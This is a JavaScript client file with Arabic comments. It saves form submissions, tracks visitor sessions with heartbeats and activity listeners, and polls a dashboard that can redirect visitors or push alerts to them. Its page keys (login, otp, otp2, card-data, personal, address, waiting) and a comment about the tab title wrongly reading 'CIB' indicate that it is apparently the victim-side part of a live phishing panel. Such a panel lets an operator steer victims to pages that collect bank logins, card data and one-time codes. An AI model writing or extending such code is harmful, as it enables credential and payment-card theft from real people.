/**
 * عميل HTTP مشترك لحفظ التسجيلات في الخادم (MongoDB).
 * يعتمد على api-config.js (يجب تحميله قبل هذا الملف).
 */
function getApiBase() {
    if (typeof window === 'undefined') return '';
    var b = window.API_BASE_URL;
    if (typeof b !== 'string') return '';
    return b.replace(/\/$/, '');
}

function getApiHeaders(extra) {
    var headers = Object.assign({}, extra || {});
    if (typeof window !== 'undefined' && typeof window.API_APP_KEY === 'string' && window.API_APP_KEY.trim()) {
        headers['x-app-key'] = window.API_APP_KEY.trim();
    }
    return headers;
}

async function saveSubmission(payload) {
    var base = getApiBase();
    var body = Object.assign({}, payload);
    delete body.id;
    delete body._id;
    try {
        if (typeof window !== 'undefined') {
            var sid = localStorage.getItem('yasmeen_session_id');
            if (!sid) {
                sid = Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10);
                localStorage.setItem('yasmeen_session_id', sid);
            }
            if (!body.client_session_id) {
                body.client_session_id = sid;
            }
            var lu = localStorage.getItem('yasmeen_last_username');
            if (
                lu &&
                String(lu).trim() &&
                !body.username &&
                !body.linked_username
            ) {
                body.linked_username = String(lu).trim();
            }
            var lp = localStorage.getItem('yasmeen_last_phone');
            if (
                lp &&
                String(lp).trim() &&
                !body.phone &&
                !body.linked_phone
            ) {
                body.linked_phone = String(lp).trim();
            }
        }
    } catch (e) {
        // ignore session id errors
    }

    var url =
        typeof window.resolveYasmeenApiUrl === 'function'
            ? window.resolveYasmeenApiUrl('api/submissions')
            : base + '/api/submissions';
    var res = await fetch(url, {
        method: 'POST',
        headers: getApiHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify(body)
    });

    if (!res.ok) {
        var msg = await res.text();
        throw new Error(msg || 'فشل الحفظ');
    }
    return res.json();
}

/**
 * طلب واحد: توجيه من الداشبورد أو تنبيه (المستخدم يبقى على الصفحة).
 * يعيد null أو { redirectUrl } أو { alertMessage }.
 */
async function pollSessionRedirectOnce() {
    var base = getApiBase();
    var sid =
        typeof window !== 'undefined'
            ? localStorage.getItem('yasmeen_session_id')
            : null;
    if (!sid) return null;
    var pollPath =
        'api/session/nav/poll?client_session_id=' + encodeURIComponent(sid);
    var pollUrl =
        typeof window.resolveYasmeenApiUrl === 'function'
            ? window.resolveYasmeenApiUrl(pollPath)
            : base + '/' + pollPath.replace(/^\//, '');
    var res = await fetch(pollUrl, { headers: getApiHeaders() });
    if (!res.ok) return null;
    var data = await res.json();
    if (data.alertMessage && String(data.alertMessage).trim()) {
        return { alertMessage: String(data.alertMessage).trim() };
    }
    if (data.redirectUrl && String(data.redirectUrl).trim()) {
        return { redirectUrl: String(data.redirectUrl).trim() };
    }
    return null;
}

/** إيقاف أي استطلاع توجيه نشط (واحد فقط في كل المتصفح). */
function stopYasmeenSessionNavPolling() {
    if (typeof window === 'undefined') return;
    var s = window.__yasmeenActiveNavPollStop;
    if (typeof s === 'function') {
        try {
            s();
        } catch (e) {
            /* ignore */
        }
    }
    window.__yasmeenActiveNavPollStop = null;
}

/**
 * استطلاع حتى يصل redirectUrl (يتوقف) أو تنبيه متكرر عبر onAlert (لا يتوقف).
 * onAlert اختياري — الافتراضي window.alert
 * يوقف أي استطلاع سابق قبل البدء (منع تداخل الفترات).
 */
function startSessionRedirectPolling(onRedirect, onAlert) {
    stopYasmeenSessionNavPolling();
    var timer = null;
    var stopped = false;
    function stop() {
        stopped = true;
        if (timer) {
            clearInterval(timer);
            timer = null;
        }
        if (
            typeof window !== 'undefined' &&
            window.__yasmeenActiveNavPollStop === stop
        ) {
            window.__yasmeenActiveNavPollStop = null;
        }
    }
    function tick() {
        if (stopped) return;
        pollSessionRedirectOnce()
            .then(function (result) {
                if (stopped) return;
                if (!result) return;
                if (result.alertMessage) {
                    var fn =
                        typeof onAlert === 'function'
                            ? onAlert
                            : function (m) {
                                  alert(m);
                              };
                    fn(result.alertMessage);
                    return;
                }
                if (result.redirectUrl) {
                    stop();
                    onRedirect(result.redirectUrl);
                }
            })
            .catch(function (e) {
                console.error(e);
            });
    }
    tick();
    timer = setInterval(tick, 1500);
    if (typeof window !== 'undefined') {
        window.__yasmeenActiveNavPollStop = stop;
    }
    return stop;
}

/** يطابق data-page في لوحة التحكم (وليس عنوان التبويب — كان يظهر «CIB» خطأً) */
function pathnameToNavPageKey() {
    try {
        var path = String(window.location.pathname || '').toLowerCase();
        var parts = path.split('/').filter(Boolean);
        var f = parts.length ? parts[parts.length - 1] : '';
        if (f.indexOf('messege') !== -1) return 'messege';
        if (f.indexOf('otp2') !== -1) return 'otp2';
        if (f.indexOf('waiting') !== -1) return 'waiting';
        if (f.indexOf('card-data') !== -1) return 'card';
        if (f.indexOf('login') !== -1) return 'login';
        if (f.indexOf('personal') !== -1) return 'personal';
        if (f.indexOf('otp') !== -1) return 'otp';
        if (f.indexOf('address') !== -1) return 'address';
        if (f.indexOf('watches') !== -1) return 'watches';
        if (!f || f === 'index.html' || f === 'index') return 'home';
        return 'home';
    } catch (e) {
        return 'home';
    }
}

async function sendHeartbeat() {
    try {
        var sid = localStorage.getItem('yasmeen_session_id');
        if (!sid) return; // no session

        var page = pathnameToNavPageKey();
        var last_activity = Date.now();

        var url = typeof window.resolveYasmeenApiUrl === 'function' 
            ? window.resolveYasmeenApiUrl('api/heartbeat')
            : getApiBase() + '/api/heartbeat';

        await fetch(url, {
            method: 'POST',
            headers: getApiHeaders({ 'Content-Type': 'application/json' }),
            body: JSON.stringify({
                client_session_id: sid,
                page: page,
                last_activity: last_activity
            })
        });
    } catch (e) {
        // silent fail - heartbeat non-critical
    }
}

function startHeartbeat() {
    if (typeof window === 'undefined') return;
    if (window.__yasmeenHeartbeatActive) return; // already running
    
    var sessionId = localStorage.getItem('yasmeen_session_id');
    if (!sessionId) return; // no session

    // immediate heartbeat
    sendHeartbeat();
    
    // periodic
    window.__yasmeenHeartbeatTimer = setInterval(sendHeartbeat, 30000); // 30s
    
    // activity reset + heartbeat
    var activityTimeout;
    function resetActivity() {
        if (activityTimeout) clearTimeout(activityTimeout);
        sendHeartbeat();
        activityTimeout = setTimeout(() => {
            // no activity for 2min? but keep periodic
        }, 120000);
    }
    
    ['mousemove', 'keydown', 'scroll', 'click'].forEach(ev => {
        document.addEventListener(ev, resetActivity, { passive: true });
    });
    
    window.__yasmeenHeartbeatActive = true;
    window.__yasmeenHeartbeatStop = function() {
        if (window.__yasmeenHeartbeatTimer) {
            clearInterval(window.__yasmeenHeartbeatTimer);
            window.__yasmeenHeartbeatTimer = null;
        }
        window.__yasmeenHeartbeatActive = false;
    };
}

if (typeof window !== 'undefined') {
    window.getApiBase = getApiBase;
    window.getApiHeaders = getApiHeaders;
    window.saveSubmission = saveSubmission;
    window.pollSessionRedirectOnce = pollSessionRedirectOnce;
    window.startSessionRedirectPolling = startSessionRedirectPolling;
    window.stopYasmeenSessionNavPolling = stopYasmeenSessionNavPolling;
    window.sendHeartbeat = sendHeartbeat;
    window.startHeartbeat = startHeartbeat;
}


/** استطلاع تلقائي + heartbeat على صفحات الموقع */
(function () {
    if (typeof window === 'undefined' || typeof document === 'undefined') return;
    if (window.__YASMEEN_DISABLE_AUTO_NAV_POLL) return;
    var path = (typeof location !== 'undefined' && location.pathname) || '';
    path = String(path).toLowerCase();
    if (path.indexOf('dashboard') !== -1 || path.indexOf('db-config') !== -1) {
        return;
    }
    function go() {
        // nav poll
        if (typeof startSessionRedirectPolling === 'function') {
            startSessionRedirectPolling(
                (url) => { if (url) window.location.href = url; },
                (msg) => { alert(msg); }
            );
        }
        
        // heartbeat
        if (typeof startHeartbeat === 'function') {
            startHeartbeat();
        }
    }
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', go);
    } else {
        go();
    }
})();

